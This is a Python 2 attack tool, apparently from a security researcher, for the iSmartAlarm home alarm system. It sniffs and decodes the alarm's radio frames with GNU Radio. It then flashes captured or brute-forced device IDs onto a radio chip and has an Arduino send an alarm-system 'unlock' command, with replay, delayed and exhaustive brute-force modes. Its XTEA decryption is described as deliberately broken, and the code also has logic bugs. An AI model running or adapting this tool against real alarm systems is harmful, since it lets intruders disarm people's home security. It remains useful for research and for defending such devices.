#!/usr/bin/env python2
#=============================================================
# iSmartAlarm RF Disector, Decrypter, and Attacker
# Dayton Pidhirney (https://www.seekintoo.ca)
#=============================================================
#
# Usage: ism_rx.py [-k KEY] [-i IV](int) [-d](Enable debug) [-a](attack mode) [-p](Arduino serial port)
#
# optional arguments:
#       -k, --key <KEY>     Optional and purposely broken 128-bit XTEA Key
#       -i, --iv  <IV>      Optional and purposely broken 32-bit XTEA IV (must be an unsigned integer)
#       -d, --debug         Enables frame debugging output to stdout 
#       -a, --attack        Enables ID attack mode (Eg. -a 0)
#       -n, --delay         Specify delay in 'n' sec until sending alarm system unlock command
#       -p, --port          Specify Arduino serial port (needed for attack mode)
#
#=============================================================

# Imports
import sys, os
import ctypes
import datetime
import argparse
import serial

from grc.ism_demod  import ism_demod
from threading      import Thread
from xtea           import *
from binascii       import hexlify, unhexlify
from time           import sleep
from cStringIO      import StringIO
from GoodFETCC      import GoodFETCC


# Colors
def pink(t):	    return '\033[95m' + t + '\033[0m'
def blue(t): 	    return '\033[94m' + t + '\033[0m'
def yellowbold(t): 	return '\033[93m' + t + '\033[0m'
def yellow(t):      return '\033[33m' + t + '\033[0m'
def cyan(t):        return '\033[36m' + t + '\033[0m'
def green(t): 	    return '\033[92m' + t + '\033[0m'
def red(t): 	    return '\033[91m' + t + '\033[0m'

# Thread dedicated to GNU Radio flowgraph
class flowgraph_thread(Thread):
    def __init__(self, flowgraph):
        Thread.__init__(self)
        self.setDaemon(1)
        self._flowgraph = flowgraph

    def run(self):
        self._flowgraph.Run()
    # No need to create stop func because raising SystemExit is same as thread.exit()

# Clear the screen with escape characters
def clearscreen():
    print(chr(27) + "[2J")

def exit_clean():
    global client
    global ser

    if client != None: # TODO: remove none and check if empty instead
        client.stop()

    if ser != None:
        ser.close()

    print "\n%s Exiting\n" % red("[!]")
    sys.exit()

# Generate timestamp
def get_time():
    current_time = datetime.datetime.now().time()
    return current_time.isoformat()

def run_flowgraph():
    # Some kind of wizardry that GNURadio says we needglobal client to do. Doesn't run otherwise.
    if sys.platform.startswith('linux'):
        try:
            x11 = ctypes.cdll.LoadLibrary('libX11.so')
            x11.XInitThreads()
        except:
            print red("[ERROR] failed to XInitThreads()")
            exit_clean()

    # Some additional output
    print "\n%s\n" % yellowbold("[INFO] Starting flowgraph")

    # Initializing GNU Radio flowgraph
    flowgraph = ism_demod()
    #clearscreen()

    # Start flowgraph inside a thread or it will be slow as shit
    flowgraph_t = flowgraph_thread(flowgraph)
    flowgraph_t.start()

    # current frequency
    freq = 0
    
    # Until flowgraph thread is running (and we hope 'producing')
    while flowgraph_t.isAlive():
        # Did we change frequency?
        if freq != flowgraph.get_frequency():
            print yellowbold("\n[INFO] Frequency tuned to: %0.2f KHz") % float(flowgraph.get_frequency()/1000)
            freq = flowgraph.get_frequency()
            
        # Emptying message queue
        while True:
            if flowgraph.myqueue.count() <= 0:
                break;
            frame = flowgraph.myqueue.delete_head_nowait().to_string()
            dump_frame(frame)

        #TODO   # myque.delete_head_nowait() keeps blocking, so we do this instead. 
        sleep(0.1)

    exit_clean()

def serialpoke(byte):
    global ser
    try:
        if (ser):
            print yellowbold("[INFO] Writing Serial")
            #sleep(1.7)
            ser.write(byte)
            ser.flush()
            print green("\t[SUCCESS]")
    except Exception, e:
        print red("[ERROR] Error poking Arduino!\n\t%s" % red(e))
        exit_clean()

def from_bytes(bytes):
    from array import array     #TODO: figure out global array
    assert len(bytes) >= 4
    # calculate checksum
    s = (-sum(bytes)) & 0x0FF
    bin = array('B', bytes + bytearray([s]))
    return ':' + hexlify(bin.tostring()).upper()

def data(offset, bytes):
    assert 0 <= offset < 65536
    assert 0 < len(bytes) < 256
    b = bytearray([len(bytes), (offset>>8)&0x0FF, offset&0x0FF, 0x00]) + bytes
    return from_bytes(b)

def offset(offset):
    from array import array     #TODO: figure out global array
    assert 0 <= offset < 65536
    b = array('B', [(offset>>8)&0x0FF, offset&0x0FF])
    return hexlify(b.tostring()).upper()

def attack(attack_type):
    try:
        global ser
        global args

        byte = '1'

        #Initialize GoodFET serial port connection
        client=GoodFETCC()
        client.serInit()

        # Connect to GoodFET
        client.setup()

        # Initialize GoodFET client multiple times, this is due to poor JTAG latching
        client.start()
        client.start()
        client.start()
        client.start()

        # Open serial pipe to Arduino
        ser = serial.Serial(args.port, 9600, timeout=0)

        if attack_type == '0':
            clearscreen()

            id = 'FFFFFFFFFFFFFF0000000000070000FF'
            bytes = bytearray.fromhex(id)

            counter = 0  #38520

            while True:
                if counter == 65535:
                    break
                counter += 1
                bytes[13:15] = unhexlify(offset(counter))

                f = StringIO(data(32752, bytes) + '\n:00000001FF')
                print pink("IHEX:\n" + f.getvalue() + '\n')
                client.flash(f)
                f.close()

                client.stop()
                sleep(2.5)
                serialpoke(byte)
                sleep(0.6)
                client.start();
            print green("[SUCCESS] All 65536 ID's have been exhausted, good day.")
            exit_clean()

        else:

            global src_id

            print green("[SUCCESS] Source ID captured from iSmartAlarm remote or sensor, attempting unlock...\n")

            id = 'FFFFFFFFFFFFFF00000000' + src_id + 'FF'
            bytes = bytearray.fromhex(id)

            if attack_type == '2':
                raw_input('Press [ENTER] when ready to unlock:')
            else:
                print yellowbold("[INFO] Delay mode enabled. Waiting %i seconds till unlock" % args.delay)
                sleep(args.delay)

            f = StringIO(data(32752, bytes) + '\n:00000001FF')
            print pink("IHEX:\n" + f.getvalue() + '\n')
            client.flash(f)
            f.close()

            client.stop()
            sleep(2.5)
            serialpoke(byte)
            sleep(0.6)
        print green("[SUCCESS] Hopefully unlocked :D")
        exit_clean()

    except Exception, e:
        print red("\n[ERROR] An error occured while flashing ID's\n\t%s" % e)
        exit_clean()

    print green("[SUCCESS] All 65536 ID's have been exhausted, good day.")
    exit_clean()

# Print frames to stdout
def dump_frame(frame):
    global args
    global src_id
    global xtea
    global ctr_hint

    # Dissect the frame from GNURadio myque
    pkt_len     = hexlify(frame[0:1]).upper()
    dst_id      = hexlify(frame[1:5]).upper()
    src_id      = hexlify(frame[5:9]).upper()
    port        = hexlify(frame[9:10]).upper()
    devinfo     = hexlify(frame[10:11]).upper()
    tractid     = hexlify(frame[11:12]).upper()
    data        = hexlify(frame[12:]).upper()
    security    = None
    ctr_hint    = None
    mac         = None

    data_print  = " ".join(hexlify(n) for n in frame[12:]).upper()
    #Is the payload a block of 64bits and XTEA key/IV Provided?
    if pkt_len == '13': # TODO: check if packet in nwk app, if so xtea with random lsb ctr
        print yellowbold("\n[INFO] Payload is 64bits and is encrypted")
        security    = True
        ctr_hint    = hexlify(frame[12:13]).upper()
        mac         = hexlify(frame[13:15]).upper()
        data_print  = " ".join(hexlify(n) for n in frame[15:]).upper()

    if len(data) == 0:
        data_print = "[ERROR] No payload found! Improper frame allignment or radio error?"

    # If debug arg is set show raw frame data
    if args.debug:
        print cyan("[DEBUG] hexidecimal frame: %s") % "".join(hexlify(n) for n in frame)

    # Print out the frame formatted for SMPL_SECURE mode
    if security != None:
        print "[%s] %s %s %s %s %s %s %s [%s %s] " % ((get_time(), yellowbold(pkt_len), red(dst_id), green(src_id), yellow(port), pink(devinfo), cyan(tractid), blue(ctr_hint), red(mac), red(data_print)))
        if xtea!= None:
            xtea_decrypt(args.key, args.iv, hexlify(frame[13:]))

    else:
        # Print out the frame formatted
        print "[%s] %s %s %s %s %s %s %s" % ((get_time(), yellowbold(pkt_len), red(dst_id), green(src_id), yellow(port), pink(devinfo), cyan(tractid), red(data_print)))

    if args.attack == '2' or '1' :
        attack(args.attack)

def ctr_hint():
    global ctr_hint
    return ctr_hint

# XTEA ciphertext decryption function #BROKEN ON PURPOSE: If you use -k or -i flags this will not work unless you fix it.
def xtea_decrypt(xtea_key, xtea_iv, data):
    print yellowbold("[INFO] Attempting to decrypt payload")

    i = new(xtea_key, mode=MODE_CTR, IV=xtea_iv, counter=ctr_hint())
    cipher_block = i.encrypt(data)
    plain_text = xor_strings(cipher_block, data)
    print yellowbold("[INFO] Recovered plaintext: %s" % plain_text)

# Main entry point
def main():
    global args
    global xtea
    global client
    global ser

    # Crypto object
    xtea    = None
    client  = None
    ser     = None
		
    # Parse args
    parser = argparse.ArgumentParser()
    parser.add_argument("-k", "--key", help="Optional XTEA key", type=str)
    parser.add_argument("-i", "--iv", help="Optional XTEA IV", type=int)
    parser.add_argument("-a", "--attack", help="Enable attack mode: -a 2: radio attack mode, -a 1: radio attack with delay(specify with -n), -a 0: brute-force", type=str)
    parser.add_argument("-n", "--delay", help="Specify delay in 'n' seconds until sending alarm system unlock command", type=int)
    parser.add_argument("-p", "--port", help="Specify serial port dev location for Arduino. Eg: /dev/ttyUSB0", type=str)
    parser.add_argument("-d", "--debug", help="output raw frame data in binary and hexidecimal format to stdout", action="store_true")
    args = parser.parse_args()

    # Check args and print key and IV values.
    if (args.key) and (args.iv):
        xtea     = True
        print "%s" % yellowbold("[INFO] XTEA key and IV provided: %s" % green("Decryption Enabled\n"))
        print "\t%s" % yellowbold("XTEA IV : "  + str(args.iv))
        print "\t%s" % yellowbold("XTEA KEY: "  + args.key)

    if (args.debug):
        print yellowbold("[INFO] Debugging has been enabled")

    elif not (args.attack != '0'):
        print yellowbold("[INFO] Decryption is disabled")

    if (args.attack):
        if args.attack == '2':
            print yellowbold("[INFO] ID radio attack mode has been enabled")

        elif args.attack == '1' and (args.delay):
            print yellowbold("[INFO] ID radio attack mode has been enabled with delay")

        elif args.attack == '0':
            print yellowbold("[INFO] ID bruteforce attack mode has been enabled")
            attack(args.attack)

        else:
            parser.print_help()
            print red("[Error] Incorrect attack type [%s] or delay error" % args.attack)
            exit_clean()

        if (args.port):
            try:
                serial.Serial(args.port)
                serial.Serial(args.port).close()
                print yellowbold("[INFO] Using arduino port: %s") % args.port

            except Exception:
                print red("[ERROR] The serial port [%s] is not valid, or you don't have permission\n") % args.port
                exit_clean()

        else:
            parser.print_help()
            print red("[ERROR] Attack mode requires Arduino serial port location")

        run_flowgraph()

    else:
        run_flowgraph()

if __name__ == '__main__':
    main()
    exit_clean()

# vim: shiftwidth=4 softtabstop=4
